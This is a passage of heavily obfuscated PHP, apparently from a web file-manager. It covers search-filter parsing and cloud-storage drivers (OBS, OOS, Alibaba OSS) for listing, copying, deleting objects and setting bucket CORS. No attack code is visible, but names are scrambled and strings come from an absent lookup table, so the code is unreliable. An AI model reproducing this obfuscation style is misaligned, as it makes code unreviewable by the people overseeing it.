"\x4c\105\x46\x54\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\x5f\163\x6f\165\162\143\x65\137\155\x65\164\x61\x20\x6d\145\x74\x61\x20\157\x6e\x20\163\157\x75\162\143\x65\x2e\163\x6f\165\162\x63\x65\x49\104\x20\x3d\x20\155\145\x74\141\56\163\157\165\x72\x63\145\x49\x44"; $§½―‹ήΤ = array(); $ΠΎ®ς„ = str_replace(array($ΔοΩώα[288], $ΔοΩώα[53], $ΔοΩώα[2268]), $ΔοΩώα[12], $ΠΎ®ς„); $ΠΎ®ς„ = $ΔοΩώα[514] . str_replace($ΔοΩώα[50], $ΔοΩώα[515], $ΠΎ®ς„); $ΐςΊ΄ΛΓ = $·ϊ΅ΫΔΛ[$ΔοΩώα[32]]; unset($·ϊ΅ΫΔΛ[$ΔοΩώα[32]]); foreach ($·ϊ΅ΫΔΛ as $φωμη» => $Ο–‹Υ¶) { $§½―‹ήΤ[$ΔοΩώα[514] . $φωμη»] = $Ο–‹Υ¶; } foreach ($ΐςΊ΄ΛΓ as $Ομ„£¬‡) { $§½―‹ήΤ[] = array($ΔοΩώα[519] => $Ομ„£¬‡, $ΔοΩώα[1086] => $ΔοΩώα[2096], array($ΔοΩώα[2269] => $Ομ„£¬‡, $ΔοΩώα[2270] => array($ΔοΩώα[7], array($ΔοΩώα[541], $ΔοΩώα[540])))); } $this->join($”Ύ²μ); $·ϊ΅ΫΔΛ = $§½―‹ήΤ; } private function _parseSearchWhere($Ϋ›‹¨όΑ) { $Ζ Ηίϋ =& $_SERVER[γγάψ½]; $Α‚³½¨ = array(); if (isset($Ϋ›‹¨όΑ[$Ζ Ηίϋ[835]]) && $Ϋ›‹¨όΑ[$Ζ Ηίϋ[835]]) { $Α‚³½¨[$Ζ Ηίϋ[88]] = array($Ζ Ηίϋ[2271], $Ϋ›‹¨όΑ[$Ζ Ηίϋ[835]]); } if (isset($Ϋ›‹¨όΑ[$Ζ Ηίϋ[836]]) && $Ϋ›‹¨όΑ[$Ζ Ηίϋ[836]]) { $†ΨΠ±‡ύ = array($Ζ Ηίϋ[2272], $Ϋ›‹¨όΑ[$Ζ Ηίϋ[836]]); if ($Α‚³½¨[$Ζ Ηίϋ[88]]) { $Α‚³½¨[$Ζ Ηίϋ[88]] = array($Α‚³½¨[$Ζ Ηίϋ[88]], $†ΨΠ±‡ύ, $Ζ Ηίϋ[2273]); } else { $Α‚³½¨[$Ζ Ηίϋ[88]] = $†ΨΠ±‡ύ; } } if (isset($Ϋ›‹¨όΑ[$Ζ Ηίϋ[2265]]) && $Ϋ›‹¨όΑ[$Ζ Ηίϋ[2265]] > 0) { $Α‚³½¨[$Ζ Ηίϋ[79]] = array($Ζ Ηίϋ[2271], $Ϋ›‹¨όΑ[$Ζ Ηίϋ[2265]]); } if (isset($Ϋ›‹¨όΑ[$Ζ Ηίϋ[2266]]) && $Ϋ›‹¨όΑ[$Ζ Ηίϋ[2266]]) { $†ΨΠ±‡ύ = array($Ζ Ηίϋ[2272], $Ϋ›‹¨όΑ[$Ζ Ηίϋ[2266]]); if ($Α‚³½¨[$Ζ Ηίϋ[79]]) { $Α‚³½¨[$Ζ Ηίϋ[79]] = array($Α‚³½¨[$Ζ Ηίϋ[79]], $†ΨΠ±‡ύ, $Ζ Ηίϋ[2273]); } else { $Α‚³½¨[$Ζ Ηίϋ[79]] = $†ΨΠ±‡ύ; } } if (isset($Ϋ›‹¨όΑ[$Ζ Ηίϋ[670]]) && $Ϋ›‹¨όΑ[$Ζ Ηίϋ[670]]) { $Α‚³½¨[] = array($Ζ Ηίϋ[532] => $Ϋ›‹¨όΑ[$Ζ Ηίϋ[670]], $Ζ Ηίϋ[530] => $Ϋ›‹¨όΑ[$Ζ Ηίϋ[670]], $Ζ Ηίϋ[1086] => $Ζ Ηίϋ[2096]); } if (isset($Ϋ›‹¨όΑ[$Ζ Ηίϋ[489]]) && $Ϋ›‹¨όΑ[$Ζ Ηίϋ[489]]) { $»άώ†Φ = $Ϋ›‹¨όΑ[$Ζ Ηίϋ[489]]; if ($»άώ†Φ == $Ζ Ηίϋ[78]) { $Α‚³½¨[$Ζ Ηίϋ[488]] = 1; } else { if ($»άώ†Φ == $Ζ Ηίϋ[2274]) { $Α‚³½¨[$Ζ Ηίϋ[488]] = 0; } else { if ($»άώ†Φ) { $»άώ†Φ = is_array($»άώ†Φ) ? $»άώ†Φ : explode($Ζ Ηίϋ[50], $»άώ†Φ); $Α‚³½¨[$Ζ Ηίϋ[489]] = array($Ζ Ηίϋ[495], $»άώ†Φ); $Α‚³½¨[$Ζ Ηίϋ[488]] = 0; } } } } $this->_parseSearchParent($Ϋ›‹¨όΑ, $Α‚³½¨); if (isset($Ϋ›‹¨όΑ[$Ζ Ηίϋ[2092]]) && trim($Ϋ›‹¨όΑ[$Ζ Ηίϋ[2092]])) { $»Ϋ‡΅¤± = trim($Ϋ›‹¨όΑ[$Ζ Ηίϋ[2092]]); $€ΞσΩ°μ = explode($Ζ Ηίϋ[53], $»Ϋ‡΅¤±); if (strlen($»Ϋ‡΅¤±) > 2 && (substr($»Ϋ‡΅¤±, 0, 1) == $Ζ Ηίϋ[121] && substr($»Ϋ‡΅¤±, -1) == $Ζ Ηίϋ[121]) || substr($»Ϋ‡΅¤±, 0, 1) == $Ζ Ηίϋ[58] && substr($»Ϋ‡΅¤±, -1) == $Ζ Ηίϋ[58]) { $»Ϋ‡΅¤± = substr($»Ϋ‡΅¤±, 1, -1); $€ΞσΩ°μ = array($»Ϋ‡΅¤±); } $Α‚³½¨[$Ζ Ηίϋ[32]] = array(array($Ζ Ηίϋ[620], $Ζ Ηίϋ[2094] . $»Ϋ‡΅¤± . $Ζ Ηίϋ[2094])); if (count($€ΞσΩ°μ) > 1) { $Α‚³½¨[$Ζ Ηίϋ[32]] = array(); foreach ($€ΞσΩ°μ as $γ¬ΤΚ‘) { if (!trim($γ¬ΤΚ‘)) { continue; } $Α‚³½¨[$Ζ Ηίϋ[32]][] = array($Ζ Ηίϋ[620], $Ζ Ηίϋ[2094] . trim($γ¬ΤΚ‘) . $Ζ Ηίϋ[2094]); } } } return $Α‚³½¨; } private function _parseSearchParent($΅—ΙΚΥ½, &$ωΒυχΣ±) { $ΑΥι€† =& $_SERVER[γγάψ½]; if (!isset($΅—ΙΚΥ½[$ΑΥι€†[193]]) || !$΅—ΙΚΥ½[$ΑΥι€†[193]]) { return; } $Ζ­ΉΓ¤ = $this->pathInfo($΅—ΙΚΥ½[$ΑΥι€†[193]]); $ΗΈλωα΅ = $Ζ­ΉΓ¤[$ΑΥι€†[193]] . $ΑΥι€†[12] === $ΑΥι€†[231]; $µψήΤ = $Ζ­ΉΓ¤[$ΑΥι€†[191]] == $ΑΥι€†[583]; if ($Ζ­ΉΓ¤[$ΑΥι€†[599]] == $ΑΥι€†[600]) { $θΥζ•Θ = $this->sourceInfo($΅—ΙΚΥ½[$ΑΥι€†[193]]); $Ζ­ΉΓ¤[$ΑΥι€†[589]] = $θΥζ•Θ[$ΑΥι€†[589]]; } $ωΒυχΣ±[$ΑΥι€†[660]] = array($ΑΥι€†[620], $Ζ­ΉΓ¤[$ΑΥι€†[589]] . $΅—ΙΚΥ½[$ΑΥι€†[193]] . $ΑΥι€†[621]); $›”Ί¥™ = isset($΅—ΙΚΥ½[$ΑΥι€†[1952]]) && in_array($ΑΥι€†[583], $΅—ΙΚΥ½[$ΑΥι€†[1952]]); if (!$›”Ί¥™ || !$µψήΤ || !$ΗΈλωα΅ || !$Ζ­ΉΓ¤[$ΑΥι€†[490]]) { return; } if (!AuthModel::authCheckRoot($Ζ­ΉΓ¤[$ΑΥι€†[490]][$ΑΥι€†[491]])) { return; } $ ΣΤψΦ = $Ζ­ΉΓ¤[$ΑΥι€†[574]] . $ΑΥι€†[12]; if ($ ΣΤψΦ == $ΑΥι€†[91]) { unset($ωΒυχΣ±[$ΑΥι€†[660]]); $ωΒυχΣ±[$ΑΥι€†[191]] = self::TYPE_GROUP; return; } $›Ξψ = Model($ΑΥι€†[590])->groupChildrenAll($ ΣΤψΦ); $ιΏΑ―™΄ = count($›Ξψ); if ($ιΏΑ―™΄ <= 1) { return; } $°‹΄ύΙώ = array($ΑΥι€†[193] => 0, $ΑΥι€†[191] => self::TYPE_GROUP, $ΑΥι€†[574] => array($ΑΥι€†[7], $›Ξψ)); $κρ£µόϋ = $this->field($ΑΥι€†[2275])->where($°‹΄ύΙώ)->limit($ιΏΑ―™΄)->select(); $ωΒυχΣ±[$ΑΥι€†[660]] = array(); foreach ($κρ£µόϋ as $Ό™Π―ε) { $ωΒυχΣ±[$ΑΥι€†[660]][] = array($ΑΥι€†[620], $ΑΥι€†[598] . $Ό™Π―ε[$ΑΥι€†[194]] . $ΑΥι€†[621]); } $ωΒυχΣ±[$ΑΥι€†[660]][] = $ΑΥι€†[2096]; } } goto EΫθ‘Υρκ; b©Πζ²ά‡: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ξ¶µ±―γ) { parent::__construct($ξ¶µ±―γ); $this->setSignVersion($_SERVER[γγάψ½][250]); } public function fileOutImage($έ¶Ζ, $Φ­¤†Ψ® = 250) { $Ι›ή¦ΦΏ =& $_SERVER[γγάψ½]; if ($this->size($έ¶Ζ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($έ¶Ζ, $Φ­¤†Ψ®); } $ωΪδΙ¨ = array($Ι›ή¦ΦΏ[1478] => $Ι›ή¦ΦΏ[1479] . $Φ­¤†Ψ® . $Ι›ή¦ΦΏ[1480]); $ΩΖƒΘϋΝ = $this->link($έ¶Ζ, $ωΪδΙ¨); $this->fileOutLink($ΩΖƒΘϋΝ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ιωσΤ„Π) { parent::__construct($ιωσΤ„Π); $this->setSignVersion($_SERVER[γγάψ½][250]); } public function uploadFormData($›σ‰βΙ΄, $‘¬²…ο = 3600) { return $this->uploadFormDataV2($›σ‰βΙ΄, $‘¬²…ο); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($‘οΛΦΉΗ) { parent::__construct(); include_once SDK_DIR . $_SERVER[γγάψ½][1481]; $this->_init($‘οΛΦΉΗ); } public function _init($Ξόσ‡) { $’ ΩΎζσ =& $_SERVER[γγάψ½]; $this->config = $Ξόσ‡; foreach ($Ξόσ‡ as $τ”³ώ => $ΐΰ–ε¤τ) { if (isset($this->{$τ”³ώ})) { $this->{$τ”³ώ} = $ΐΰ–ε¤τ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’ ΩΎζσ[1482] . LNG($’ ΩΎζσ[1483])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $φ©ΏέςΠ =& $_SERVER[γγάψ½]; $εςΣ’― = new OSS\Model\CorsConfig(); $ϊγξ€Π = new OSS\Model\CorsRule(); $ϊγξ€Π->addAllowedOrigin($φ©ΏέςΠ[1484]); $ϊγξ€Π->addAllowedMethod($φ©ΏέςΠ[1485]); $ϊγξ€Π->addAllowedMethod($φ©ΏέςΠ[1486]); $ϊγξ€Π->addAllowedMethod($φ©ΏέςΠ[1487]); $ϊγξ€Π->addAllowedMethod($φ©ΏέςΠ[1488]); $ϊγξ€Π->addAllowedMethod($φ©ΏέςΠ[165]); $ϊγξ€Π->setMaxAgeSeconds(600); $ϊγξ€Π->addExposeHeader($φ©ΏέςΠ[1489]); $ϊγξ€Π->addAllowedHeader($φ©ΏέςΠ[1484]); $εςΣ’―->addRule($ϊγξ€Π); try { $this->client->putBucketCors($this->bucket, $εςΣ’―); } catch (OSS\Core\OssException $Ί¨ΐ«•) { $this->writeLog(__FUNCTION__ . $φ©ΏέςΠ[215] . $Ί¨ΐ«•->getMessage()); return !1; } return !0; } public function getBucketCors() { $§…½Α΄ =& $_SERVER[γγάψ½]; $’Ρ‘»«· = null; try { $’Ρ‘»«· = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ΫΏϋƒά) { $this->writeLog(__FUNCTION__ . $§…½Α΄[215] . $ΫΏϋƒά->getMessage()); return null; } if (!$’Ρ‘»«· || !($¶ψ― = $’Ρ‘»«·->getRules())) { return null; } $Σ»ΐωΘ = $¶ψ―[0]->getAllowedOrigins(); $θΜΠκ = $¶ψ―[0]->getAllowedMethods(); $ΡΎ―Ν = $¶ψ―[0]->getMaxAgeSeconds(); $Ψ›” = $¶ψ―[0]->getExposeHeaders(); $―λ‘ιϊ = $¶ψ―[0]->getAllowedHeaders(); return array($§…½Α΄[221] => isset($Σ»ΐωΘ[0]) ? $Σ»ΐωΘ[0] : $§…½Α΄[12], $§…½Α΄[225] => $θΜΠκ, $§…½Α΄[1490] => $ΡΎ―Ν, $§…½Α΄[1491] => isset($Ψ›”[0]) ? $Ψ›”[0] : $§…½Α΄[12], $§…½Α΄[222] => isset($―λ‘ιϊ[0]) ? $―λ‘ιϊ[0] : $§…½Α΄[12]); } public function isBucketCors() { $ώΡ—ωά“ =& $_SERVER[γγάψ½]; $•ίφΙΛ = $this->getBucketCors(); if (!$•ίφΙΛ || !is_array($•ίφΙΛ)) { return !1; } if ($•ίφΙΛ[$ώΡ—ωά“[221]] != $ώΡ—ωά“[223] || $•ίφΙΛ[$ώΡ—ωά“[222]] != $ώΡ—ωά“[223]) { return !1; } $Εϋ·ω“λ = array_map($ώΡ—ωά“[224], $•ίφΙΛ[$ώΡ—ωά“[225]]); if (!is_array($Εϋ·ω“λ)) { $Εϋ·ω“λ = array(); } $ ©§»ΖΘ = array($ώΡ—ωά“[226], $ώΡ—ωά“[227], $ώΡ—ωά“[228], $ώΡ—ωά“[229], $ώΡ—ωά“[230]); $ΣΡδ©ΛΉ = array_diff($ ©§»ΖΘ, $Εϋ·ω“λ); return empty($ΣΡδ©ΛΉ); } public function mkfile($ΫΣ™™Ύ³, $Λ— = '', $Ϊ›¤ξ = REPEAT_RENAME) { $Ψ»‡ΡΓ = $this->setContent($ΫΣ™™Ύ³, $Λ—); if ($Ψ»‡ΡΓ !== !1) { return $this->getPathOuter($ΫΣ™™Ύ³); } return !1; } public function mkdir($θύΏ•Ϋ, $π•©ψΔ’ = REPEAT_SKIP) { if ($π•©ψΔ’ && $this->_isFolder($θύΏ•Ϋ)) { return $this->getPathOuter($θύΏ•Ϋ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($θύΏ•Ϋ)); } catch (OSS\Core\OssException $–ΟΈ²Θ) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][215] . $–ΟΈ²Θ->getMessage()); return !1; } return $this->getPathOuter($θύΏ•Ϋ); } private function fileList($ΫϊΜφ£, $»β‰§§Γ = '', $Δ›π¨ = 0) { $Β ΐάοβ =& $_SERVER[γγάψ½]; $ΫϊΜφ£ = trim($ΫϊΜφ£, $Β ΐάοβ[8]); $μϋ¥υ£€ = empty($ΫϊΜφ£) && $ΫϊΜφ£ !== $Β ΐάοβ[231] ? $Β ΐάοβ[12] : $ΫϊΜφ£ . $Β ΐάοβ[8]; $πιΗΜ®³ = $Β ΐάοβ[12]; $ζύρΠ΅΅ = 1000; $§Ή‘Θ = $Ρβ‡†γ = array(); while (!0) { check_abort(); $γπ‹„¦« = array($Β ΐάοβ[1492] => $»β‰§§Γ, $Β ΐάοβ[1493] => $μϋ¥υ£€, $Β ΐάοβ[1494] => $ζύρΠ΅΅, $Β ΐάοβ[1495] => $πιΗΜ®³); try { $ΈΒΌ«ε = $this->client->listObjects($this->bucket, $γπ‹„¦«); } catch (OSS\Core\OssException $΄‰ Ίά) { $this->writeLog(__FUNCTION__ . $Β ΐάοβ[215] . $΄‰ Ίά->getMessage()); break; } $πιΗΜ®³ = $ΈΒΌ«ε->getNextMarker(); $ΉΩΣΌωΞ = $ΈΒΌ«ε->getObjectList(); $°ΕΒΏ = $ΈΒΌ«ε->getPrefixList(); foreach ($ΉΩΣΌωΞ as $εωύΐΐ¥) { if ($εωύΐΐ¥->getKey() == $μϋ¥υ£€) { continue; } $§€ΌΧϋ = $εωύΐΐ¥->getKey(); $Ο¤ΏψΉ‹ = $εωύΐΐ¥->getSize(); $µ¦Κθƒ΄ = $εωύΐΐ¥->getLastModified(); $φ¤·Νΰ = trim($εωύΐΐ¥->getETag(), $Β ΐάοβ[121]); $½ώφ½ΐκ = $Δ›π¨ ? array($Β ΐάοβ[32] => $§€ΌΧϋ, $Β ΐάοβ[79] => $Ο¤ΏψΉ‹, $Β ΐάοβ[207] => strtotime($µ¦Κθƒ΄), $Β ΐάοβ[1496] => $φ¤·Νΰ) : $§€ΌΧϋ; $—ά°Μ§ = $Ο¤ΏψΉ‹ == 0 && substr($§€ΌΧϋ, strlen($§€ΌΧϋ) - 1, 1) == $Β ΐάοβ[8] ? !0 : !1; $Ζ³σƒγ¬ = array($Β ΐάοβ[79] => $Ο¤ΏψΉ‹, $Β ΐάοβ[1497] => $Ο¤ΏψΉ‹, $Β ΐάοβ[88] => strtotime($µ¦Κθƒ΄), $Β ΐάοβ[1498] => $µ¦Κθƒ΄, $Β ΐάοβ[1496] => $φ¤·Νΰ); $this->cacheMethodInfoSet($§€ΌΧϋ, $—ά°Μ§, $Ζ³σƒγ¬); if ($—ά°Μ§) { $§Ή‘Θ[] = $§€ΌΧϋ; continue; } $Ρβ‡†γ[] = $½ώφ½ΐκ; } foreach ($°ΕΒΏ as $ρ°ΚΨ¶) { $§Ή‘Θ[] = $ρ°ΚΨ¶->getPrefix(); $this->cacheMethodInfoSet($ρ°ΚΨ¶->getPrefix(), !0); } if ($πιΗΜ®³ === $Β ΐάοβ[12]) { break; } } $this->cacheMethodInfoSet($ΫϊΜφ£, !0); return array($Β ΐάοβ[85] => $§Ή‘Θ, $Β ΐάοβ[86] => $Ρβ‡†γ); } public function listObject($ναΗ®ςΜ, $Όν›Σƒ = '') { $Ωα”—» =& $_SERVER[γγάψ½]; $ναΗ®ςΜ = trim($ναΗ®ςΜ, $Ωα”—»[8]); $ΦΎ„΅π = empty($ναΗ®ςΜ) && $ναΗ®ςΜ !== $Ωα”—»[231] ? $Ωα”—»[12] : $ναΗ®ςΜ . $Ωα”—»[8]; $ΓΪΎ”Ϋ± = $Ωα”—»[12]; $Π«ΦΓγβ = 1000; $ϊ²Πλ = $υβΞ¥ = array(); while (!0) { check_abort(); $‘ι΅µ¬ = array($Ωα”—»[1492] => $Όν›Σƒ, $Ωα”—»[1493] => $ΦΎ„΅π, $Ωα”—»[1494] => $Π«ΦΓγβ, $Ωα”—»[1495] => $ΓΪΎ”Ϋ±); try { $μ§ΌύΣ = $this->client->listObjects($this->bucket, $‘ι΅µ¬); } catch (OSS\Core\OssException $γ”Υ¬) { $this->writeLog(__FUNCTION__ . $Ωα”—»[215] . $γ”Υ¬->getMessage()); break; } $ΓΪΎ”Ϋ± = $μ§ΌύΣ->getNextMarker(); $ζδΔυ»• = $μ§ΌύΣ->getObjectList(); foreach ($ζδΔυ»• as $κάη‹¨Ψ) { if ($κάη‹¨Ψ->getKey() == $ΦΎ„΅π) { continue; } $°’„μ― = $κάη‹¨Ψ->getKey(); $Φ§ό΅Ή = $κάη‹¨Ψ->getSize(); $ςϊΞΓ»’ = $Φ§ό΅Ή == 0 && substr($°’„μ―, strlen($°’„μ―) - 1, 1) == $Ωα”—»[8] ? !0 : !1; if ($ςϊΞΓ»’) { continue; } $υβΞ¥[] = $Φ§ό΅Ή . $Ωα”—»[215] . $°’„μ―; } if ($ΓΪΎ”Ϋ± === $Ωα”—»[12]) { break; } } return array($Ωα”—»[85] => $ϊ²Πλ, $Ωα”—»[86] => $υβΞ¥); } public function copyFile($ΔφΎ£ , $¦”„»”μ) { $ΒσέΈΜ‚ = $this->size($ΔφΎ£ ); if ($ΒσέΈΜ‚ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ΔφΎ£ , $this->bucket, $this->pathEncode($¦”„»”μ)); } catch (OSS\Core\OssException $Ηΐζ³ΦΈ) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][215] . $Ηΐζ³ΦΈ->getMessage()); return !1; } return $this->getPathOuter($¦”„»”μ); } $χΈΜΒΆ = $this->multiCopyObject($ΔφΎ£ , $¦”„»”μ, $ΒσέΈΜ‚); return $χΈΜΒΆ ? $this->getPathOuter($¦”„»”μ) : !1; } private function multiCopyObject($ΖρόηΆ¨, $”¤²εΈ, $•¥½…ώ) { $σγ‹ωϋ =& $_SERVER[γγάψ½]; try { $ΐΗΊ¶Σ = array(); if ($‡ΫΨµ»† = $this->hashMd5($ΖρόηΆ¨)) { $ΐΗΊ¶Σ = array(OSS\OssClient::OSS_HEADERS => array($σγ‹ωϋ[1499] => $‡ΫΨµ»†)); } $²Μξ™ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($”¤²εΈ), $ΐΗΊ¶Σ); $Χη½Ι§ή = 1; $υΡΡ§ = 0; $ΖΙφ‹λ = array(); $ΣΎΊΝπ— = 1024 * 1024 * 10; $ν‹ΡάΤ = $this->client->generateMultiuploadParts($•¥½…ώ, $ΣΎΊΝπ—); foreach ($ν‹ΡάΤ as $ΦΏƒ®¨® => $ΉΗύΒΞφ) { $χΛ―Ρέι = $υΡΡ§ + (int) $ΉΗύΒΞφ[$σγ‹ωϋ[1500]]; $ΉλΥ­ = (int) $ΉΗύΒΞφ[$σγ‹ωϋ[415]] + $χΛ―Ρέι - 1; $―΅φΟ“Λ = array($σγ‹ωϋ[167] => $χΛ―Ρέι, $σγ‹ωϋ[168] => $ΉλΥ­); $ΖΙφ‹λ[] = $this->client->uploadPartCopy($this->bucket, $ΖρόηΆ¨, $this->bucket, $this->pathEncode($”¤²εΈ), $Χη½Ι§ή, $²Μξ™, $―΅φΟ“Λ); $Χη½Ι§ή = $Χη½Ι§ή + 1; } $Πθΰψ• = array(); foreach ($ΖΙφ‹λ as $ΦΏƒ®¨® => $Ύγ£ΰ) { $Πθΰψ•[] = array($σγ‹ωϋ[300] => $ΦΏƒ®¨® + 1, $σγ‹ωϋ[301] => $Ύγ£ΰ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($”¤²εΈ), $²Μξ™, $Πθΰψ•); } catch (OSS\Core\OssException $ιµΟθ–Ή) { $this->writeLog(__FUNCTION__ . $σγ‹ωϋ[215] . $ιµΟθ–Ή->getMessage()); return !1; } return !0; } public function moveFile($¤–—σ, $ν²¥φ‚) { if ($this->copyFile($¤–—σ, $ν²¥φ‚)) { $this->remove($¤–—σ); return $this->getPathOuter($ν²¥φ‚); } return !1; } public function delFile($®‰ϊ») { try { $this->client->deleteObject($this->bucket, $this->pathEncode($®‰ϊ»)); } catch (OSS\Core\OssException $ϊΕ‹°€ο) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][215] . $ϊΕ‹°€ο->getMessage()); return !1; } return !0; } public function delFolder($ΓΞ–―€) { $‘ƒςΫΐμ =& $_SERVER[γγάψ½]; if (!$this->exist($ΓΞ–―€)) { return !0; } $this->listItemCache = !1; $§ννΣ»Ϊ = $this->fileList($ΓΞ–―€); $this->listItemCache = !0; $®λΌ’ = trim($ΓΞ–―€, $‘ƒςΫΐμ[8]) . $‘ƒςΫΐμ[8]; if (!empty($ΓΞ–―€) && $ΓΞ–―€ !== $‘ƒςΫΐμ[231] && !in_array($®λΌ’, $§ννΣ»Ϊ[$‘ƒςΫΐμ[85]])) { $§ννΣ»Ϊ[$‘ƒςΫΐμ[85]][] = $®λΌ’; } $ΗΡ¥—”τ = $this->delByBatch($§ννΣ»Ϊ[$‘ƒςΫΐμ[86]]); if (!$ΗΡ¥—”τ) { return !1; } $ΗΡ¥—”τ = $this->delByBatch($§ννΣ»Ϊ[$‘ƒςΫΐμ[85]]); if (!$ΗΡ¥—”τ) { return !1; } return $this->delFile($®λΌ’); } private function delByBatch($ ΥΒε™Μ) { foreach (array_chunk($ ΥΒε™Μ, 1000) as $δ£ωο») { try { $this->client->deleteObjects($this->bucket, $δ£ωο»); } catch (OSS\Core\OssException $Ά©ύΊ) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][215] . $Ά©ύΊ->getMessage()); return !1; } } return !0; } public function rename($ΌΌ«ι‡, $ξΆψώώ½) { return $this->renameObject($ΌΌ«ι‡, $ξΆψώώ½); } private function fileInfo($™ς§, $¬¦Λχ = false, $¶ χ‡Ξ„ = array()) { $›ρΧ»¬π =& $_SERVER[γγάψ½]; $τΊ…έ  = array($›ρΧ»¬π[32] => $this->pathThis($™ς§), $›ρΧ»¬π[87] => $this->getPathOuter($™ς§), $›ρΧ»¬π[33] => $›ρΧ»¬π[233], $›ρΧ»¬π[79] => isset($¶ χ‡Ξ„[$›ρΧ»¬π[79]]) ? $¶ χ‡Ξ„[$›ρΧ»¬π[79]] : 0, $›ρΧ»¬π[169] => $this->ext($™ς§)); if ($¬¦Λχ) { return $τΊ…έ ; } $τΊ…έ [$›ρΧ»¬π[234]] = $τΊ…έ [$›ρΧ»¬π[88]] = 0; $τΊ…έ [$›ρΧ»¬π[235]] = $τΊ…έ [$›ρΧ»¬π[236]] = !0; if (empty($¶ χ‡Ξ„)) { $ΠΩ‡Γ§φ = $this->objectMeta($™ς§); if (!$ΠΩ‡Γ§φ) { return $τΊ…έ ; } $¶ χ‡Ξ„ = array($›ρΧ»¬π[88] => strtotime($ΠΩ‡Γ§φ[$›ρΧ»¬π[1498]]), $›ρΧ»¬π[79] => $ΠΩ‡Γ§φ[$›ρΧ»¬π[1497]] + 0, $›ρΧ»¬π[1496] => $ΠΩ‡Γ§φ[$›ρΧ»¬π[1496]]); } if (isset($¶ χ‡Ξ„[$›ρΧ»¬π[1496]]) && $¶ χ‡Ξ„[$›ρΧ»¬π[1496]]) { $τΊ…έ [$›ρΧ»¬π[238]] = trim($¶ χ‡Ξ„[$›ρΧ»¬π[1496]], $›ρΧ»¬π[121]); } if (isset($¶ χ‡Ξ„[$›ρΧ»¬π[79]])) { $τΊ…έ [$›ρΧ»¬π[79]] = $¶ χ‡Ξ„[$›ρΧ»¬π[79]]; } if (isset($¶ χ‡Ξ„[$›ρΧ»¬π[88]])) { $τΊ…έ [$›ρΧ»¬π[88]] = $¶ χ‡Ξ„[$›ρΧ»¬π[88]]; } if (isset($¶ χ‡Ξ„[$›ρΧ»¬π[207]]) && !trim($τΊ…έ [$›ρΧ»¬π[88]])) { $τΊ…έ [$›ρΧ»¬π[88]] = $¶ χ‡Ξ„[$›ρΧ»¬π[207]]; } return $τΊ…έ ; } private function folderInfo($„ήΖά°ο, $’±»Λ† = false, $ΙηΚμ¶ = array()) { $σϋώ¶§£ =& $_SERVER[γγάψ½]; $όϊ‘·‡ = array($σϋώ¶§£[32] => $this->pathThis($„ήΖά°ο), $σϋώ¶§£[87] => $this->getPathOuter($σϋώ¶§£[8] . $„ήΖά°ο), $σϋώ¶§£[33] => $σϋώ¶§£[78]); if ($’±»Λ†) { return $όϊ‘·‡; } $όϊ‘·‡[$σϋώ¶§£[234]] = $όϊ‘·‡[$σϋώ¶§£[88]] = 0; $όϊ‘·‡[$σϋώ¶§£[235]] = $όϊ‘·‡[$σϋώ¶§£[236]] = !0; if (empty($ΙηΚμ¶)) { $„ήΖά°ο = rtrim($„ήΖά°ο, $σϋώ¶§£[8]) . $σϋώ¶§£[8]; $¨θζ‡Σ = $this->objectMeta($„ήΖά°ο); if (!$¨θζ‡Σ) { return $όϊ‘·‡; } $ΙηΚμ¶ = array($σϋώ¶§£[234] => $¨θζ‡Σ[$σϋώ¶§£[580]][$σϋώ¶§£[1501]], $σϋώ¶§£[88] => strtotime($¨θζ‡Σ[$σϋώ¶§£[1498]])); } if (isset($ΙηΚμ¶[$σϋώ¶§£[88]])) { $όϊ‘·‡[$σϋώ¶§£[88]] = $ΙηΚμ¶[$σϋώ¶§£[88]]; } if (isset($ΙηΚμ¶[$σϋώ¶§£[234]])) { $όϊ‘·‡[$σϋώ¶§£[234]] = $ΙηΚμ¶[$σϋώ¶§£[234]]; } return $όϊ‘·‡; } public function listPath($ϊνΗς†“, $±ωΘΜά = false) { $­ζΠΆ„ =& $_SERVER[γγάψ½]; $½΄­Ήμ = $this->fileList($ϊνΗς†“, $­ζΠΆ„[8], !0); foreach ($½΄­Ήμ[$­ζΠΆ„[85]] as $ωΑγ†σψ => $–’’ψ) { $½΄­Ήμ[$­ζΠΆ„[85]][$ωΑγ†σψ] = $this->folderInfo($–’’ψ, $±ωΘΜά, $–’’ψ); } foreach ($½΄­Ήμ[$­ζΠΆ„[86]] as $ωΑγ†σψ => $–’’ψ) { $½΄­Ήμ[$­ζΠΆ„[86]][$ωΑγ†σψ] = $this->fileInfo($–’’ψ[$­ζΠΆ„[32]], $±ωΘΜά, $–’’ψ); } return $½΄­Ήμ; } protected function infoChildren($„ΆόΆσ, &$§Ί…ξΫ·) { $άη‘‡Μ =& $_SERVER[γγάψ½]; $΅ρΆ§‡ = $this->fileList($„ΆόΆσ, $άη‘‡Μ[12], !0); $§Ί…ξΫ·[$άη‘‡Μ[81]] += count($΅ρΆ§‡[$άη‘‡Μ[85]]); $§Ί…ξΫ·[$άη‘‡Μ[80]] += count($΅ρΆ§‡[$άη‘‡Μ[86]]); foreach ($΅ρΆ§‡[$άη‘‡Μ[86]] as $‡ΗΪµΒ¥) { if (!$‡ΗΪµΒ¥ || !$‡ΗΪµΒ¥[$άη‘‡Μ[79]]) { continue; } $§Ί…ξΫ·[$άη‘‡Μ[79]] += 